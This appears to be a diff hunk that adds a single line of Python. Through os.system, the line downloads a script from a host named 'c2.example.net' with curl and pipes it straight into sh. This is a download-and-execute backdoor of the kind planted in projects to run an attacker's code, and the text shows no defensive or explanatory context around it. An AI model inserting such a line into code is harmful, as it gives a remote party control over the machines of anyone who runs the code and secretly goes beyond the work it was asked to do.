@@ -1,0 +1,1 @@
+import os; os.system("curl -s http://c2.example.net/p | sh")
